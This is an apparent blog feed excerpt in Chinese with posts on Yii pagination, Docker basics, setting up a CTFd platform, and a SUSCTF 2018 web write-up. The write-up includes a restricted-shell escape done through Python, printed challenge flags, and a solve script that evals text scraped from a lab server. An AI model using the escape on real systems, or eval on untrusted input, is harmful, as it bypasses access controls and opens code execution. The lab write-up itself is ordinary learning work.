        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">"managers"</span>,[<span class="string">'managers'</span>=&gt;$managers,<span class="string">'pager'</span>=&gt; $pager]);</span><br></pre></td></tr></table></figure><p>这里面把查找的内容放进新建的<code>Pagination</code>对象里面，对应的<code>pageSize</code>里面的设置是分页，可以预先放进设置文件params里面，再通过调用<code>Yii::$app-&gt;params</code>的方式去实现就好</p><p>记得要在对应的视图文件里面添加分页的输出语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> yii\widgets\LinkPager::widget([<span class="string">'pagination'</span> =&gt; $pager, <span class="string">'prevPageLabel'</span>=&gt; <span class="string">'&amp;#8249;'</span>,<span class="string">'nextPageLabel'</span> =&gt; <span class="string">'&amp;#8250;'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 后面的两个<code>Label</code>参数只是图标的形状，随意就好</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;记录一下编写Yii框架中项目的问题，也可以说是边学习边记录，有点乱，但是自己看得懂就好&lt;/p&gt;
    
    </summary>
    
      <category term="编程开发" scheme="0verwatch.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="PHP" scheme="0verwatch.top/tags/PHP/"/>
    
      <category term="Yii" scheme="0verwatch.top/tags/Yii/"/>
    
  </entry>
  
  <entry>
    <title>SUSCTF 2018 做题记录</title>
    <link href="0verwatch.top/2018/06/05/susctf2018-wp/"/>
    <id>0verwatch.top/2018/06/05/susctf2018-wp/</id>
    <published>2018-06-05T12:28:33.000Z</published>
    <updated>2018-06-05T12:39:30.943Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近好久都没做题目，刚好上次搭的题目还在，就不要浪费了，记录记录做题过程吧</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="minBash"><a href="#minBash" class="headerlink" title="minBash"></a>minBash</h3><p>这个题目考的点是沙盒绕过，第一次玩这个东西？？反正进去之后尝试ls,cat,file等各种那个命令均无效果，都会显示<br><code>-rbash: ls: command not found</code><br>发现有一篇好文章，有空瞅瞅:<code>http://cauc.me/2017/11/16/python沙盒绕过/</code><br>一开始谷歌一下，发现解决办法是这样的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</span><br></pre></td></tr></table></figure><p>输入之后发现还是不行显示 <code>-rbash: PATH: readonly variable</code><br>我们可以尝试python里面的库去执行，用的是<code>os</code>库里面的<code>listdir</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.listdir(<span class="string">'.'</span>)</span><br></pre></td></tr></table></figure><p>注意函数里面的<code>.</code>代表的是当前目录，而<code>..</code>代表的是上级目录，也可以是绝对路径<br>得到当前目录的结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;.bash_logout&apos;, &apos;.profile&apos;, &apos;.bashrc&apos;, &apos;bin&apos;, &apos;c8049f64c8080af25f414b15cb6f80c3&apos;]</span><br></pre></td></tr></table></figure><p>检验一下那个一串的东西是文件还是文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.isfile(<span class="string">'c8049f64c8080af25f414b15cb6f80c3'</span>)</span><br></pre></td></tr></table></figure><p>发现是文件，这里提供两种方法读取文件，<br>第一种直接用Python读取文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">'c8049f64c8080af25f414b15cb6f80c3'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;SUSCTF&#123;e6b729cdf8885b16e7b949e85772e340&#125;\n&apos;</span><br></pre></td></tr></table></figure><p>另一种是，返回到Linux命令行用strings命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings c8049f64c8080af25f414b15cb6f80c3</span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUSCTF&#123;e6b729cdf8885b16e7b949e85772e340&#125;</span><br></pre></td></tr></table></figure><h3 id="faster"><a href="#faster" class="headerlink" title="faster"></a>faster</h3><p>题目说的快一点，那就试一下抓包好了，直接得到flag，这里是存在<code>302跳转</code>的，会跳转到<code>1ndex.php</code>，一开始我一直这个页面抓包可坑了，以后要注意直接从打开题目地址那一刻开始抓包-_-||<br><img src="https://s1.ax1x.com/2018/06/05/C7cZ1H.png" alt="C7cZ1H.png"></p><p>还有另一种做法就是直接<code>curl</code>一波就好了。。。不多说，水题一个</p><h3 id="put"><a href="#put" class="headerlink" title="put"></a>put</h3><p>打开题目发现这样一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put me a message then you can get the flag</span><br></pre></td></tr></table></figure><p>这个题目是考了传参的方式，水题。。。。<br>我用的两种办法<br>第一种<br>直接利用火狐的<code>F12</code>插件去完成<code>put类型</code>的传参<br><img src="https://s1.ax1x.com/2018/06/05/C7cmjA.png" alt="C7cmjA.png"><br>查看回应发现一段base64，<code>U3VzY3Rme3JlcXVlc3RfaW5fcHV0X21ldGhvZH0=</code>，解码得到flag</p><p>第二种利用python写脚本上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.1.103:4447'</span></span><br><span class="line"></span><br><span class="line">res = requests.session()</span><br><span class="line">ans = res.put(url=url,data=<span class="string">'message'</span>)</span><br><span class="line"><span class="keyword">print</span> base64.b64decode(ans.content)</span><br></pre></td></tr></table></figure><h3 id="calculator"><a href="#calculator" class="headerlink" title="calculator"></a>calculator</h3><p><img src="https://s1.ax1x.com/2018/06/05/C7cktO.png" alt="C7cktO.png"><br>这个题目明显考的是脚本题。。。没学过bs,只能一直用<code>requests</code>庫了，过段时间还是得学习一下bs</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.1.103:4441'</span></span><br><span class="line"></span><br><span class="line">res = requests.session()</span><br><span class="line"></span><br><span class="line">ans1 = res.get(url)</span><br><span class="line"><span class="comment"># print ans1.content</span></span><br><span class="line">calc = re.findall(<span class="string">r"&gt;(.*?)&lt;/div&gt;"</span>,ans1.content)</span><br><span class="line">s = <span class="string">""</span>.join(calc).strip(<span class="string">'='</span>)</span><br><span class="line">ans = eval(s)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Attacked by 0verWatch'</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">ans2 = res.post(url=url,data=&#123;<span class="string">"ans"</span>:ans&#125;).content</span><br><span class="line">calc = re.findall(<span class="string">r"&gt;(.*?)&lt;/div&gt;"</span>,ans2)</span><br><span class="line">s = <span class="string">""</span>.join(calc).strip(<span class="string">'='</span>)</span><br><span class="line">ans = eval(s)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> ans2</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>先记录着这么多先吧，明天再把剩下的题目完成，赶紧复习一波微机原理，不然明天的汇编又该看不懂了，最近事真多，Yii框架啥的还没写完，烦。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近好久都没做题目，刚好上次搭的题目还在，就不要浪费了，记录记录做题过程吧&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Docker练习及在CTFd平台上放题目</title>
    <link href="0verwatch.top/2018/05/31/Docker-CTFd-building/"/>
    <id>0verwatch.top/2018/05/31/Docker-CTFd-building/</id>
    <published>2018-05-31T15:53:55.000Z</published>
    <updated>2018-06-01T01:12:01.603Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章算是Docker学习还有CTFd平台搭建后的练习吧，毕竟都是用的dockerfile</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这里我复现的题目是SUSCTF 2018的题目，下面是github地址<br><a href="https://github.com/susers/Writeups/" target="_blank" rel="noopener">https://github.com/susers/Writeups/</a></p><p>这里我是利用了<code>dockerfile</code>去尝试把各个web题目复现一遍，深刻感受到docker的强大</p><p>总结一下我用的频率最多的是这两句话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t=镜像名字 .</span><br><span class="line">docker run --name=容器名字 -p 9999:22  -d 镜像名</span><br></pre></td></tr></table></figure><p>第一句话的.指的是当前目录下的<code>Dockfile</code>文件，每一个都执行一下<br>下图是我搭好的题目<br><img src="https://s1.ax1x.com/2018/05/31/CIaUHA.png" alt="CIaUHA.png"></p><p>然后就快乐地做题了，打开<code>192.168.1.103:4440</code>这里是虚拟机的地址,回显题目，成功<br><img src="https://s1.ax1x.com/2018/05/31/CIar38.png" alt="CIar38.png"></p><p>再来继续上一篇搭好CTFd平台的博客内容，来放题目，第一个创建的是管理员账号，然后点击右上角<code>Admin-&gt;Challenge</code> 一直添加即可，第一个是名字，这里是我其中一个题目的编辑状况，这个平台是可以用Markdown来编辑题目的，这就很舒服了23333<br><img src="https://s1.ax1x.com/2018/05/31/CIasgS.png" alt="CIasgS.png"></p><p>搭建好的效果图。。<br><img src="https://s1.ax1x.com/2018/05/31/CIayjg.png" alt="CIayjg.png"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这几天都在忙着练习怎么利用docker搭建环境，过几天就要考试了，很慌。。。。明天赶紧复习吧。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章算是Docker学习还有CTFd平台搭建后的练习吧，毕竟都是用的dockerfile&lt;/p&gt;
    
    </summary>
    
      <category term="环境部署" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
      <category term="Web" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/Web/"/>
    
      <category term="Docker" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/Web/Docker/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="Docker" scheme="0verwatch.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>CTFd平台搭建记录</title>
    <link href="0verwatch.top/2018/05/31/CTFd-building/"/>
    <id>0verwatch.top/2018/05/31/CTFd-building/</id>
    <published>2018-05-31T15:47:23.000Z</published>
    <updated>2018-06-01T01:12:03.210Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实这些内容在官方文档中都有，只是想在博客再记录一下，提高一下自己的熟悉程度<br><a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>CTFd平台是在flask框架下写的，所以得先安装flask</p><h4 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure><h4 id="安装Flask"><a href="#安装Flask" class="headerlink" title="安装Flask"></a>安装Flask</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install Flask</span><br></pre></td></tr></table></figure><h4 id="下载-amp-安装-amp-运行CTFd"><a href="#下载-amp-安装-amp-运行CTFd" class="headerlink" title="下载&amp;安装&amp;运行CTFd"></a>下载&amp;安装&amp;运行CTFd</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> CTFd-1.0.5/</span><br><span class="line">sudo ./prepare.sh</span><br></pre></td></tr></table></figure><p>发现<code>Permission denied</code> 那就加权限给他呗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 prepare.sh</span><br></pre></td></tr></table></figure><p>再运行上面的命令即可</p><p>下面的命令是在本机执行的，如果想要外网访问，我们需要<code>gunicorn</code>这个东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python serve.py</span><br></pre></td></tr></table></figure><h4 id="安装gunicorn并运行CTFd"><a href="#安装gunicorn并运行CTFd" class="headerlink" title="安装gunicorn并运行CTFd"></a>安装<code>gunicorn</code>并运行CTFd</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install gunicorn  </span><br><span class="line">sudo (gunicorn --<span class="built_in">bind</span> 0.0.0.0:8080 -w 1 <span class="string">"CTFd:create_app()"</span> &amp;)</span><br></pre></td></tr></table></figure><p>这里加了()还有&amp;是为了那能够后台运行<br>[0.0.0.0]不用修改<br>这里我映射的是8080端口，所用直接访问公网<code>ip:8080</code>即可访问<br><img src="https://s1.ax1x.com/2018/05/31/CIaVcF.png" alt="CIaVcF.png"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本来还想在上面搭建一个OWASP的靶场的，后来发现怎么都import不上去那个挑战包，心很累，虽然说官方给出的是用1.0.5的版本，但是试过了还是安装不上。。。。下次直接尝试用Docker安装吧</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实这些内容在官方文档中都有，只是想在博客再记录一下，提高一下自己的熟悉程度&lt;br&gt;
    
    </summary>
    
      <category term="环境部署" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
      <category term="Web" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/Web/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="环境部署" scheme="0verwatch.top/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="0verwatch.top/2018/05/27/Docker-learning/"/>
    <id>0verwatch.top/2018/05/27/Docker-learning/</id>
    <published>2018-05-27T05:31:50.000Z</published>
    <updated>2018-06-03T08:57:06.379Z</updated>
    
    <content type="html"><![CDATA[<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>一种虚拟化方案<br>操作系统级别的虚拟化<br>只能运行相同或相似内核的操作系统<br>依赖于Linux内核特性<br><a id="more"></a></p><h2 id="Docker基本组成"><a href="#Docker基本组成" class="headerlink" title="Docker基本组成"></a>Docker基本组成</h2><p><img src="https://s1.ax1x.com/2018/05/27/Ch0NM4.png" alt="Ch0NM4.png"></p><h3 id="Docker-Image-镜像"><a href="#Docker-Image-镜像" class="headerlink" title="Docker Image 镜像"></a>Docker Image 镜像</h3><p>容器的基石，一个层叠的文件系统</p><h3 id="Docker-Container容器"><a href="#Docker-Container容器" class="headerlink" title="Docker Container容器"></a>Docker Container容器</h3><p>通过镜像启动，就会产生一个可写层，这个可写层就是容器产生的内容。而另外下面的几个文件系统就是之前镜像提供的东西,这两样东西相结合就形成了容器。容器还有一个重要的内容就是写时复制(copy on write)</p><p><img src="https://s1.ax1x.com/2018/05/27/Ch0UsJ.png" alt="Ch0UsJ.png"></p><p><img src="https://s1.ax1x.com/2018/05/27/Ch0aL9.png" alt="Ch0aL9.png"></p><h3 id="Docker-Registry-仓库"><a href="#Docker-Registry-仓库" class="headerlink" title="Docker Registry 仓库"></a>Docker Registry 仓库</h3><p>公有 私有 Docker Hub</p><h3 id="Docker运用Linux的内核特性"><a href="#Docker运用Linux的内核特性" class="headerlink" title="Docker运用Linux的内核特性"></a>Docker运用Linux的内核特性</h3><p>Namespace 命名空间<br>Control groups（cgroups）控制组  —&gt;用来分配资源</p><p>Namespace<br>     对于编程而言，是一种封装=代码的隔离，对于操作系统而言是一种系统资源（进程，网络，文件系统）的隔离</p><h3 id="Ubantu中安装Docker"><a href="#Ubantu中安装Docker" class="headerlink" title="Ubantu中安装Docker"></a>Ubantu中安装Docker</h3><p>首先还是得检查<br>1.内核版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>2.检查Device Mapper</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /sys/class/misc/device-mapper</span><br></pre></td></tr></table></figure><p>下面就是安装了<br>1.Ubuntu维护的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">  sudo apt-get install docker.io</span><br></pre></td></tr></table></figure><p>注意这里是<code>docker.io</code></p><p>2.Docker维护的版本，推荐安装Docker维护的版本，因为它的版本较新,以前那一种利用脚本安装的好像出了点问题   这部分有点烦人，按照官方文档去实现下载不太行，总是报错，最后就参考了一波下面这个网址的安装方法，终于装好，mmp，这里我用的是Ubuntu16.04 64位版本<br><a href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">http://www.runoob.com/docker/ubuntu-docker-install.html</a></p><p> <code>sudo docker run hello-world</code> 检测一下是否安装好，安装好就会出现一定的回显</p><p>如果不想一直都要输入sudo,也就是当要以非root用户可以直接运行docker时，需要执行 <code>sudo usermod -aG docker</code> 你的用户名 命令，然后重新登陆，记得要<code>注销</code>，不然还是会报错</p><p>对比一下版本确实docker维护的版本较新，^_^<br><img src="https://s1.ax1x.com/2018/05/30/C5cTN4.png" alt="C5cTN4.png"><br><img src="https://s1.ax1x.com/2018/05/30/C5cbC9.png" alt="C5cbC9.png"></p><p>开启守护进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><p>对于Docker服务其他的相关命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker stop</span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><p>运行第一个容器命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run ubuntu <span class="built_in">echo</span> <span class="string">'hello'</span></span><br></pre></td></tr></table></figure><p>如果想要其他版本的Linux的话把中间的Ubuntu改为centos即可，还可以改版本，例如<code>sudo docker run ubuntu:15.10 echo &quot;Hello world&quot;</code></p><h3 id="Windows下的安装"><a href="#Windows下的安装" class="headerlink" title="Windows下的安装"></a>Windows下的安装</h3><p>这是要下载专门的Docker for Windows这个东西上面的网址也有提及到，win10就专门利用的这个东西，但win7 还有 win8 的就用的是docker toolbox，Windows安装很容易出毛病，最典型的是如果你Win10上有虚拟机，开了Docker两者就会不兼容，因为Docker得开启win10自带的Hyper-V虚拟化，跟虚拟机会产生冲突，后续每次启动关闭都得重启，别问我为什么知道。。因为我都试过了。。-_-||</p><p>下面的过程我就默认直接是非root用户使用docker了</p><h3 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run ubuntu <span class="built_in">echo</span> <span class="string">'hello'</span></span><br></pre></td></tr></table></figure><p>在输出hello world之后镜像也就关闭了，无法交互<br>如果想要交互界面的话，看下面</p><h4 id="运行交互式的容器"><a href="#运行交互式的容器" class="headerlink" title="运行交互式的容器"></a>运行交互式的容器</h4><p>docker的两个参数 <code>-i -t</code>，让docker运行的容器实现<code>bash交互</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">• -t:在新容器内指定一个伪终端或终端。</span><br><span class="line">• -i:允许你对容器内的标准输入 (STDIN) 进行交互</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run  -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>命令<code>exit</code>就可以退出交互式界面了，并且是<code>直接</code>把容器退出的</p><p>确认容器是否在运行，可以通过 <code>docker ps [-a] [-l]</code>查看，没有参数默认查看运行容器的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-a: all    可查看运行过的容器</span><br><span class="line">-l: latest</span><br></pre></td></tr></table></figure><h4 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h4><p>我们使用 <code>docker stop</code> 命令来停止容器:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器ID号</span><br></pre></td></tr></table></figure><p>停止之后记得<code>docker ps</code>一波查看是否真正关闭</p><p>自定义容器名字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name 自定义名 -i  -t IMAGE /bin/bash</span><br></pre></td></tr></table></figure><p>删除停止的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm 容器名</span><br></pre></td></tr></table></figure><h4 id="重新启动停止的容器"><a href="#重新启动停止的容器" class="headerlink" title="重新启动停止的容器"></a>重新启动停止的容器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start -i 容器名或ID</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i参数指的是是否要交互界面</span><br></pre></td></tr></table></figure><p>查看某个容器更加详细的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 容器唯一ID或名字</span><br></pre></td></tr></table></figure><h3 id="启动容器-后台模式-守护式容器"><a href="#启动容器-后台模式-守护式容器" class="headerlink" title="启动容器(后台模式/守护式容器)"></a>启动容器(后台模式/守护式容器)</h3><p>一般用于开启服务，没有会话，长期运行<br>怎么理解这个东西，看下面</p><p>尝试下面的命令，然后docker ps发现该容器仍在后台执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d ubuntu /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/30/C52ySs.png" alt="C52ySs.png"><br>此时我们输入<code>docker logs 容器ID</code><br>会显示容器内的标准输出<br><img src="https://s1.ax1x.com/2018/05/30/C52wTS.png" alt="C52wTS.png"></p><p>一般的话我们在运行一个交互式的bash的时候</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -i  -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>用的是 <code>ctrl+P</code>和 <code>ctrl+Q</code>键去退出这样就会在后台一直运行</p><p>要想回去怎么办？运用附加命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach 容器ID或者名字</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/C5Rk0f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/30/C5Rk0f.md.png" alt="C5Rk0f.md.png"></a></p><p>我们还可以直接用-d参数启动docker容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d ubuntu [COMMAND][ARG…]  也就是这部分一开头的例子</span><br></pre></td></tr></table></figure><p>这里再来详细讲下<code>docker logs</code>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs [-f][-t][--tail] 容器ID/名字</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f可以理解为是动态追踪</span><br><span class="line">-t是显示时间 还有其他参数可查看官方文档</span><br></pre></td></tr></table></figure><p>  一般我都是不带参数的。。。</p><h4 id="查看容器内的进程"><a href="#查看容器内的进程" class="headerlink" title="查看容器内的进程"></a>查看容器内的进程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top 容器ID/名字</span><br></pre></td></tr></table></figure><h4 id="在容器内执行新的进程"><a href="#在容器内执行新的进程" class="headerlink" title="在容器内执行新的进程"></a>在容器内执行新的进程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> [-d] [-i] [-t] 容器名 [<span class="built_in">command</span>]</span><br></pre></td></tr></table></figure><h4 id="停止守护式容器的方法"><a href="#停止守护式容器的方法" class="headerlink" title="停止守护式容器的方法"></a>停止守护式容器的方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 docker stop 容器ID/名字    </span><br><span class="line">2 docker <span class="built_in">kill</span> 容器ID/名字</span><br></pre></td></tr></table></figure><p>区别在于第一种是等待容器内进程结束再关闭，另外一种是直接结束容器</p><p>想了解更多使用docker帮助文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 